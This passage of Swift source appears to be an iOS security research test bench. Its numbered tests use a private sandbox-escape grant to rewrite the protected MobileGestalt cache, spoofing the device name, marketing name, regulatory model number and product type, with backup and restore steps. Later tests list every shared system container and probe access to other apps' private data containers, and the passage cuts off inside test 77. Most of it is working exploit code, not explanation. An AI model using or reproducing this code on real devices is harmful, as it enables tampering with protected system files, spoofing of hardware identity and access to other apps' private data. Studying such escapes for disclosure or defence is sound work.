        benchLine("??? 62 ?? writing a value into the cache")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] no group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        // Ensure a fresh backup exists before the first change.
        let docs = NSHomeDirectory() + "/Documents"
        let backup = docs + "/mg-cache-backup.plist"
        if !FileManager.default.fileExists(atPath: backup) {
            try? data.write(to: URL(fileURLWithPath: backup))
            benchLine("     backup ensured: \(backup)")
        }

        let before = extra["UserAssignedDeviceName"] as? String ?? "<none>"
        let newName = "iPhone Bench27"
        extra["UserAssignedDeviceName"] = newName
        plist["CacheExtra"] = extra
        plist["CacheUUID"] = UUID().uuidString

        guard let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                            format: .binary, options: 0) else {
            benchLine("[NO] serialisation failed"); return
        }
        do {
            try out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes")
        } catch {
            benchLine("     write failed: \(error.localizedDescription)"); return
        }

        // Read back.
        if let check = FileManager.default.contents(atPath: path),
           let p2 = try? PropertyListSerialization.propertyList(from: check, format: nil),
           let r2 = p2 as? [String: Any],
           let e2 = r2["CacheExtra"] as? [String: Any] {
            let after = e2["UserAssignedDeviceName"] as? String ?? "<none>"
            benchLine("     UserAssignedDeviceName: \(before) ??? \(after)")
        }
        benchLine("     open Settings ??? General ??? About to see the new name")
        benchLine("     restore with test 63")
        benchLine("??? done")
    }

    // MARK: - test 63: restore the cache from the backup

    func bench63GestaltRestore() {
        benchLine("??? 63 ?? restoring the cache")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        let docs = NSHomeDirectory() + "/Documents"
        let backup = docs + "/mg-cache-backup.plist"

        guard let data = FileManager.default.contents(atPath: backup) else {
            benchLine("[NO] no backup at \(backup)"); return
        }
        guard let group = firstUsableGroup() else { benchLine("[NO] no group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        do {
            try data.write(to: URL(fileURLWithPath: path))
            benchLine("     restored \(data.count) bytes from the backup")
        } catch {
            benchLine("     restore failed: \(error.localizedDescription)")
        }
        benchLine("??? done")
    }

    private var benchGestaltPath: String {
        "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"
    }

    // MARK: - test 64: list every key in the cache

    /// Test 61 found 84 keys under CacheExtra but none of the names we expected,
    /// so the key space has to be read before anything can be changed. This prints
    /// all of them and marks the ones that look like identity or model data.
    func bench64GestaltKeys() {
        benchLine("??? 64 ?? every key in the gestalt cache")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] no group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        guard handle >= 0 else { benchLine("[NO] grant \(handle)"); return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              let plist = try? PropertyListSerialization.propertyList(from: data, format: nil),
              let root = plist as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }
        guard let extra = root["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] no CacheExtra"); return
        }

        let keys = extra.keys.sorted()
        benchLine("     \(keys.count) keys")

        // Print in rows of four to keep the log compact.
        var row: [String] = []
        for k in keys {
            row.append(k)
            if row.count == 4 {
                benchLine("     \(row.joined(separator: " ?? "))")
                row.removeAll()
            }
        }
        if !row.isEmpty { benchLine("     \(row.joined(separator: " ?? "))") }

        // Highlight the ones that matter for identity.
        let hints = ["model", "serial", "name", "product", "device", "region", "hw", "board", "unique"]
        let interesting = keys.filter { k in
            let low = k.lowercased()
            return hints.contains { low.contains($0) }
        }
        benchLine("     identity-looking keys: \(interesting.count)")
        for k in interesting.prefix(20) {
            benchLine("          \(k) = \(extra[k] ?? "?")")
        }
        benchLine("??? done")
    }

    // MARK: - test 65: change the marketing name by its real key

    /// The cache keys are hashed, so the identity values live under opaque names.
    /// The one holding "iPhone 17 Pro" is Z/dqyWS6OZTRy10UcmUAhw. This rewrites it
    /// and leaves CacheUUID alone, since a changed UUID can invalidate the file.
    func bench65GestaltMarketingName() {
        benchLine("??? 65 ?? rewrite the marketing name")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        let keyName = "Z/dqyWS6OZTRy10UcmUAhw"   // marketing name
        let keyModel = "MKE8hwsOxxRCtwBk2aDBZA"  // product type
        benchLine("     before: name=\(extra[keyName] ?? "?") ?? model=\(extra[keyModel] ?? "?")")

        // Fresh backup, no UUID change.
        let docs = NSHomeDirectory() + "/Documents"
        try? FileManager.default.createDirectory(atPath: docs, withIntermediateDirectories: true)
        let backup = docs + "/mg-cache-backup.plist"
        try? data.write(to: URL(fileURLWithPath: backup))
        benchLine("     backup: \(backup)")

        let newName = "iPhone 17 Pro Bench"
        extra[keyName] = newName
        plist["CacheExtra"] = extra
        // CacheUUID and CacheVersion stay exactly as they were.

        guard let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                            format: .binary, options: 0) else {
            benchLine("[NO] serialise"); return
        }
        do {
            try out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes (was \(data.count))")
        } catch {
            benchLine("     write failed: \(error.localizedDescription)"); return
        }

        if let check = FileManager.default.contents(atPath: path),
           let p2 = try? PropertyListSerialization.propertyList(from: check, format: nil),
           let r2 = p2 as? [String: Any],
           let e2 = r2["CacheExtra"] as? [String: Any] {
            benchLine("     after:  name=\(e2[keyName] ?? "?") ?? uuid unchanged=\(String(describing: r2["CacheUUID"]))")
        }
        benchLine("     reboot, then open Settings ??? General ??? About")
        benchLine("     restore with test 63")
        benchLine("??? done")
    }

    // MARK: - test 66: did the cache write survive a reboot

    /// Test 65 changed the marketing name and left CacheUUID alone. This reads the
    /// file back to see whether the value is still there, which separates "the file
    /// persists" from "the daemon rebuilds it at boot".
    func bench66GestaltPersist() {
        benchLine("??? 66 ?? did the write survive the reboot")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        var sb = stat()
        if stat(path, &sb) == 0 {
            let modified = Date(timeIntervalSince1970: TimeInterval(sb.st_mtimespec.tv_sec))
            let fmt = DateFormatter()
            fmt.dateFormat = "yyyy-MM-dd HH:mm:ss"
            benchLine("     file: \(sb.st_size) bytes ?? modified \(fmt.string(from: modified))")
        }

        guard let data = FileManager.default.contents(atPath: path),
              let plist = try? PropertyListSerialization.propertyList(from: data, format: nil),
              let root = plist as? [String: Any],
              let extra = root["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot read the cache"); return
        }

        let keyName = "Z/dqyWS6OZTRy10UcmUAhw"
        let current = extra[keyName] as? String ?? "<missing>"
        benchLine("     marketing name now: \(current)")
        benchLine("     CacheUUID: \(root["CacheUUID"] ?? "?") ?? CacheVersion: \(root["CacheVersion"] ?? "?")")

        // Look for the string we wrote anywhere in the file.
        let raw = String(decoding: data, as: UTF8.self)
        benchLine("     'Bench' present in the file: \(raw.contains("Bench"))")

        if current.contains("Bench") {
            benchLine("[OK] the write persisted across the reboot")
        } else {
            benchLine("[NO] the cache was rebuilt ??? the file is a mirror, not the source")
        }
        benchLine("??? done")
    }

    // MARK: - test 67: write both marketing-name keys

    /// The cache holds "iPhone 17 Pro" under two keys and the About screen was
    /// unchanged after writing one of them. This writes both, reports what the
    /// binary CacheData blob contains, and leaves CacheUUID alone.
    func bench67GestaltBothKeys() {
        benchLine("??? 67 ?? write both marketing-name keys")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        let keys = ["Z/dqyWS6OZTRy10UcmUAhw", "bbtR9jQx50Fv5Af/affNtA"]
        for k in keys {
            benchLine("     before \(k) = \(extra[k] ?? "?")")
        }

        // What does the binary blob hold?
        if let cacheData = plist["CacheData"] as? Data {
            benchLine("     CacheData: \(cacheData.count) bytes")
            for probe in ["Ilyas", "iPhone 17 Pro", "MG864J/A", "M27RYXW"] {
                let found = cacheData.range(of: Data(probe.utf8)) != nil
                benchLine("          contains \"\(probe)\": \(found)")
            }
        } else {
            benchLine("     CacheData: not a data blob")
        }

        // Back up once more, then write both keys.
        let docs = NSHomeDirectory() + "/Documents"
        try? FileManager.default.createDirectory(atPath: docs, withIntermediateDirectories: true)
        let backup = docs + "/mg-cache-backup.plist"
        try? data.write(to: URL(fileURLWithPath: backup))
        benchLine("     backup: \(backup)")

        let newName = "iPhone 17 Pro Bench"
        for k in keys { extra[k] = newName }
        plist["CacheExtra"] = extra

        guard let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                            format: .binary, options: 0) else {
            benchLine("[NO] serialise"); return
        }
        do {
            try out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes")
        } catch {
            benchLine("     write failed: \(error.localizedDescription)"); return
        }

        if let check = FileManager.default.contents(atPath: path),
           let p2 = try? PropertyListSerialization.propertyList(from: check, format: nil),
           let r2 = p2 as? [String: Any],
           let e2 = r2["CacheExtra"] as? [String: Any] {
            for k in keys { benchLine("     after  \(k) = \(e2[k] ?? "?")") }
        }
        benchLine("     reboot, then Settings ??? General ??? About")
        benchLine("     restore with test 63")
        benchLine("??? done")
    }

    // MARK: - test 68: ask MobileGestalt what it reports

    /// The cache file was changed and the About screen did not follow. The
    /// decisive question is what libMobileGestalt itself answers now, since that
    /// is what Settings reads.
    func bench68GestaltAnswers() {
        benchLine("??? 68 ?? what MobileGestalt answers")

        let names = ["MarketingName", "ProductType", "ModelNumber", "SerialNumber",
                     "UserAssignedDeviceName", "DeviceName", "ProductName",
                     "RegulatoryModelNumber", "DeviceClass", "HardwareModel",
                     "UniqueDeviceID", "BuildVersion"]

        // libMobileGestalt is private: resolve at runtime.
        guard let lib = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW) else {
            benchLine("[NO] cannot load libMobileGestalt"); return
        }
        defer { dlclose(lib) }
        guard let sym = dlsym(lib, "MGGetStringAnswer") else {
            benchLine("[NO] MGGetStringAnswer not found"); return
        }
        typealias AnswerFn = @convention(c) (CFString) -> Unmanaged<CFString>?
        let answerFn = unsafeBitCast(sym, to: AnswerFn.self)

        for name in names {
            guard let cf = name as CFString? else { continue }
            if let out = answerFn(cf) {
                benchLine("     \(name) = \(out.takeRetainedValue() as String)")
            } else {
                benchLine("     \(name) = <nil>")
            }
        }

        benchLine("     if these still show the original values, the cache is not the source")
        benchLine("??? done")
    }

    // MARK: - test 69: is the cache the source MobileGestalt reads

    /// RegulatoryModelNumber is a key we are allowed to read. This changes its
    /// cached value, asks MobileGestalt what it reports, then restores the value,
    /// so we learn whether the file feeds the answers without any lasting change.
    func bench69GestaltLive() {
        benchLine("??? 69 ?? is the cache live")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        // Which key holds the regulatory model number?
        let original = "A3522"
        var holder: String?
        for (k, v) in extra where (v as? String) == original {
            holder = k
            break
        }
        guard let key = holder else {
            benchLine("[NO] no key holds \"\(original)\""); return
        }
        benchLine("     key \(key) = \(original)")
        benchLine("     MG before: \(mgString("RegulatoryModelNumber"))")

        // Change, ask, restore.
        let substitute = "A9999"
        extra[key] = substitute
        plist["CacheExtra"] = extra
        guard let changed = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                               format: .binary, options: 0) else {
            benchLine("[NO] serialise"); return
        }
        do {
            try changed.write(to: URL(fileURLWithPath: path))
        } catch {
            benchLine("[NO] write: \(error.localizedDescription)"); return
        }
        benchLine("     wrote \(substitute)")
        benchLine("     MG after:  \(mgString("RegulatoryModelNumber"))")

        // Restore the original value.
        extra[key] = original
        plist["CacheExtra"] = extra
        if let back = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                          format: .binary, options: 0) {
            try? back.write(to: URL(fileURLWithPath: path))
            benchLine("     restored \(original)")
            benchLine("     MG now:    \(mgString("RegulatoryModelNumber"))")
        }

        benchLine("     a changed answer means the file is the source")
        benchLine("??? done")
    }

    private func mgString(_ name: String) -> String {
        guard let lib = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW) else { return "<no lib>" }
        defer { dlclose(lib) }
        guard let sym = dlsym(lib, "MGGetStringAnswer") else { return "<no sym>" }
        typealias AnswerFn = @convention(c) (CFString) -> Unmanaged<CFString>?
        let fn = unsafeBitCast(sym, to: AnswerFn.self)
        guard let key = name as CFString? else { return "<cf>" }
        guard let out = fn(key) else { return "<nil>" }
        return out.takeRetainedValue() as String
    }

    // MARK: - test 70: stage the change for a fresh process

    /// libMobileGestalt caches answers inside the process, so a value written and
    /// then queried in the same run proves nothing. This writes the substitute and
    /// stops; test 71 reads it from a new process.
    func bench70GestaltStage() {
        benchLine("??? 70 ?? stage the change")
        benchLine("     after this, force-quit the app and run test 71")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        let key = "97JDvERpVwO+GHtthIh7hA"   // RegulatoryModelNumber
        let before = extra[key] as? String ?? "?"
        benchLine("     \(key): \(before) ??? A9999")
        extra[key] = "A9999"
        plist["CacheExtra"] = extra

        guard let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                            format: .binary, options: 0) else {
            benchLine("[NO] serialise"); return
        }
        do {
            try out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes")
        } catch {
            benchLine("[NO] write: \(error.localizedDescription)"); return
        }
        benchLine("     now force-quit the app, launch it again, run test 71")
        benchLine("??? done")
    }

    // MARK: - test 71: read the answer from a fresh process

    /// Runs in a new process, so the value comes from whatever the system actually
    /// consults. Then it restores the original value.
    func bench71GestaltFresh() {
        benchLine("??? 71 ?? answer in a fresh process")

        let answer = mgString("RegulatoryModelNumber")
        benchLine("     MG answers: \(answer)")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        if answer == "A9999" {
            benchLine("[OK] the cache is the source ??? a written value is what MG reports")
        } else if answer == "A3522" {
            benchLine("[NO] the cache is a mirror ??? MG reads the value from elsewhere")
        } else {
            benchLine("[?] unexpected answer")
        }

        // Restore.
        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else { return }
        extra["97JDvERpVwO+GHtthIh7hA"] = "A3522"
        plist["CacheExtra"] = extra
        if let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                         format: .binary, options: 0) {
            try? out.write(to: URL(fileURLWithPath: path))
            benchLine("     restored A3522 ?? file now \(out.count) bytes")
        }
        benchLine("??? done")
    }

    // MARK: - test 72: persistent change of the reported model

    /// Test 71 proved the cache feeds MobileGestalt. This writes the regulatory
    /// model number and moves every ProductType value to the neighbouring model,
    /// leaving both in place so the effect survives a Settings restart.
    func bench72GestaltModel() {
        benchLine("??? 72 ?? persistent model change")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        // Always keep a fresh copy before a change of this size.
        let docs = NSHomeDirectory() + "/Documents"
        try? FileManager.default.createDirectory(atPath: docs, withIntermediateDirectories: true)
        let backup = docs + "/mg-cache-backup.plist"
        try? data.write(to: URL(fileURLWithPath: backup))
        benchLine("     backup: \(backup)")

        // 1. Regulatory model number.
        let regKey = "97JDvERpVwO+GHtthIh7hA"
        let regBefore = extra[regKey] as? String ?? "?"
        extra[regKey] = "A9999"
        benchLine("     \(regKey): \(regBefore) ??? A9999")

        // 2. Every key that carries the product type.
        var moved: [String] = []
        for (k, v) in extra where (v as? String) == "iPhone18,1" {
            extra[k] = "iPhone18,2"
            moved.append(k)
        }
        benchLine("     product type keys moved to iPhone18,2: \(moved.count)")
        for k in moved.prefix(8) { benchLine("          \(k)") }

        plist["CacheExtra"] = extra
        guard let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                            format: .binary, options: 0) else {
            benchLine("[NO] serialise"); return
        }
        do {
            try out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes")
        } catch {
            benchLine("[NO] write: \(error.localizedDescription)"); return
        }

        benchLine("     force-quit Settings (or the app), reopen About")
        benchLine("     revert with test 73")
        benchLine("??? done")
    }

    // MARK: - test 73: put the model values back

    func bench73GestaltModelRestore() {
        benchLine("??? 73 ?? restore model values")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        extra["97JDvERpVwO+GHtthIh7hA"] = "A3522"
        var back = 0
        for (k, v) in extra where (v as? String) == "iPhone18,2" {
            extra[k] = "iPhone18,1"
            back += 1
        }
        benchLine("     model values restored: \(back) key(s)")

        plist["CacheExtra"] = extra
        if let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                         format: .binary, options: 0) {
            try? out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes")
        }
        benchLine("     force-quit Settings to see the original values again")
        benchLine("??? done")
    }

    // MARK: - test 74: the nested product description

    /// The Model Name does not come from the flat string keys: GestaltX edits
    /// ArtworkDeviceProductDescription, which lives inside a dictionary value.
    /// This changes only that field.
    func bench74GestaltProductDescription() {
        benchLine("??? 74 ?? nested product description")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        // Back up before touching a nested value.
        let docs = NSHomeDirectory() + "/Documents"
        try? FileManager.default.createDirectory(atPath: docs, withIntermediateDirectories: true)
        let backup = docs + "/mg-cache-backup.plist"
        try? data.write(to: URL(fileURLWithPath: backup))
        benchLine("     backup: \(backup)")

        // Find every dictionary that carries the field.
        var touched = 0
        for (k, v) in extra {
            guard var dict = v as? [String: Any],
                  let current = dict["ArtworkDeviceProductDescription"] as? String else { continue }
            benchLine("     \(k): \(current) ??? iPhone 16 Pro Max")
            dict["ArtworkDeviceProductDescription"] = "iPhone 16 Pro Max"
            extra[k] = dict
            touched += 1
        }
        guard touched > 0 else {
            benchLine("[NO] no dictionary carries ArtworkDeviceProductDescription")
            return
        }

        plist["CacheExtra"] = extra
        guard let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                            format: .binary, options: 0) else {
            benchLine("[NO] serialise"); return
        }
        do {
            try out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes ?? \(touched) field(s) changed")
        } catch {
            benchLine("[NO] write: \(error.localizedDescription)"); return
        }

        benchLine("     force-quit Settings or restart; revert with test 75")
        benchLine("??? done")
    }

    // MARK: - test 75: put the product description back

    func bench75GestaltProductDescriptionRestore() {
        benchLine("??? 75 ?? restore the product description")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              var plist = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any],
              var extra = plist["CacheExtra"] as? [String: Any] else {
            benchLine("[NO] cannot parse"); return
        }

        var touched = 0
        for (k, v) in extra {
            guard var dict = v as? [String: Any],
                  (dict["ArtworkDeviceProductDescription"] as? String) == "iPhone 16 Pro Max" else { continue }
            dict["ArtworkDeviceProductDescription"] = "iPhone 17 Pro"
            extra[k] = dict
            touched += 1
        }
        benchLine("     restored \(touched) field(s) to iPhone 17 Pro")

        plist["CacheExtra"] = extra
        if let out = try? PropertyListSerialization.data(fromPropertyList: plist,
                                                         format: .binary, options: 0) {
            try? out.write(to: URL(fileURLWithPath: path))
            benchLine("     wrote \(out.count) bytes")
        }
        benchLine("??? done")
    }

    // MARK: - test 76: inventory of the shared system containers

    /// The escape reaches every shared system group, not just the gestalt cache.
    /// This walks all of them two levels deep, reads what is small, and reports
    /// what each daemon keeps there. Read-only.
    func bench76SystemGroupInventory() {
        benchLine("??? 76 ?? inventory of the shared system containers")

        guard let group = firstUsableGroup() else {
            benchLine("[NO] no App Group"); return
        }
        let flags: UInt64 = 0x0000_0080_0000_0000

        // Names of the groups, resolved by inode so no grant is needed yet.
        var st = statfs()
        guard statfs("/private/var/containers/Shared/SystemGroup", &st) == 0 else {
            benchLine("[NO] statfs"); return
        }
        var buf = [CChar](repeating: 0, count: 1024)
        var dirs: [String] = []
        let prefix = "/private/var/containers/Shared/SystemGroup/"
        for inode in UInt64(1)...UInt64(250_000) {
            var fs = st.f_fsid
            let n = buf.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buf)
            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            if let first = rest.split(separator: "/").first {
                let dir = prefix + String(first)
                if !dirs.contains(dir) { dirs.append(dir) }
            }
        }
        benchLine("     groups: \(dirs.count)")

        var notable: [String] = []
        var totalFiles = 0
        var totalBytes = 0

        func walk(_ path: String, depth: Int) -> (Int, Int) {
            let handle = path.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
            guard handle >= 0 else { return (0, 0) }
            defer { wq_revoke(handle) }

            var files = 0, bytes = 0
            var names: [String] = []
            if let d = opendir(path) {
                while let e = readdir(d) {
                    let name = withUnsafeBytes(of: e.pointee.d_name) { raw -> String in
                        String(decoding: raw.prefix { $0 != 0 }, as: UTF8.self)
                    }
                    if name == "." || name == ".." { continue }
                    names.append(name)
                }
                closedir(d)
            }

            for name in names {
                let full = (path as NSString).appendingPathComponent(name)
                var sb = stat()
                guard stat(full, &sb) == 0 else { continue }
                if (sb.st_mode & S_IFMT) == S_IFDIR {
                    if depth < 2 {
                        let (f, b) = walk(full, depth: depth + 1)
                        files += f; bytes += b
                    }
                } else {
                    files += 1
                    bytes += Int(sb.st_size)
                    let lower = name.lowercased()
                    let interesting = lower.hasSuffix(".mobileconfig") || lower.hasSuffix(".plist")
                        || lower.hasSuffix(".sqlite") || lower.hasSuffix(".db")
                        || lower.contains("profile")
                    if interesting && notable.count < 24 {
                        notable.append("\(full.replacingOccurrences(of: prefix, with: "")) ?? \(sb.st_size) B")
                    }
                }
            }
            return (files, bytes)
        }

        for dir in dirs {
            let short = dir.replacingOccurrences(of: prefix, with: "")
            let (files, bytes) = walk(dir, depth: 0)
            totalFiles += files
            totalBytes += bytes
            benchLine("     \(short.padding(toLength: 46, withPad: " ", startingAt: 0)) \(files) files ?? \(bytes) B")
        }

        benchLine("     total: \(totalFiles) files ?? \(totalBytes) bytes across \(dirs.count) groups")
        benchLine("     notable files: \(notable.count)")
        for n in notable { benchLine("          \(n)") }
        benchLine("     everything here is read and written through the container grant")
        benchLine("??? done")
    }

    // MARK: - test 77: are there container classes beyond SystemGroup

    /// The published file manager lists container paths beyond SystemGroup.
    /// Listing comes from fsgetpath, which needs no grant; the question is whether
    /// a grant is issued for those classes too. This asks for each of them.
    func bench77ContainerClasses() {
        benchLine("??? 77 ?? container classes beyond SystemGroup")

        guard let group = firstUsableGroup() else { benchLine("[NO] App Group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000

        func grant(_ path: String) -> Int64 {
            path.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        }
        func listCount(_ path: String) -> Int {
            guard let d = opendir(path) else { return -1 }
            defer { closedir(d) }
            var n = 0
            while let e = readdir(d) { if e.pointee.d_name.0 != 46 { n += 1 } }
            return n
        }

        // A representative child of each class, resolved by inode so it exists.
        func firstChild(_ parent: String, prefix: String) -> String? {
            var st = statfs()
            guard statfs(parent, &st) == 0 else { return nil }
            var buf = [CChar](repeating: 0, count: 1024)
            for inode in UInt64(1)...UInt64(250_000) {
                var fs = st.f_fsid
                let n = buf.withUnsafeMutableBufferPointer { bp -> Int in
                    withUnsafePointer(to: &fs) { fp in
                        xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                    }
                }
                if n <= 0 { continue }
                let p = String(cString: buf)
                guard p.hasPrefix(prefix) else { continue }
                let rest = p.dropFirst(prefix.count)
                if let first = rest.split(separator: "/").first {
                    return prefix + String(first)
                }
            }
            return nil
        }

        var targets: [String] = [
            "/private/var/containers/Data/System",
        ]
        if let c = firstChild("/private/var/mobile/Containers/Data/Application",
                              prefix: "/private/var/mobile/Containers/Data/Application/") {
            targets.append(c)
        }
        if let c = firstChild("/private/var/mobile/Containers/Data/InternalDaemon",
                              prefix: "/private/var/mobile/Containers/Data/InternalDaemon/") {
            targets.append(c)
        }
        if let c = firstChild("/private/var/mobile/Containers/Data/PluginKitPlugin",
                              prefix: "/private/var/mobile/Containers/Data/PluginKitPlugin/") {
            targets.append(c)
        }
        if let c = firstChild("/private/var/mobile/Containers/Shared/AppGroup",
                              prefix: "/private/var/mobile/Containers/Shared/AppGroup/") {
            targets.append(c)
        }

        for target in targets {
            let short = target.replacingOccurrences(of: "/private", with: "")
            var sb = stat()
            let exists = stat(target, &sb) == 0
            let handle = grant(target)
            var r = false, w = false, entries = -1
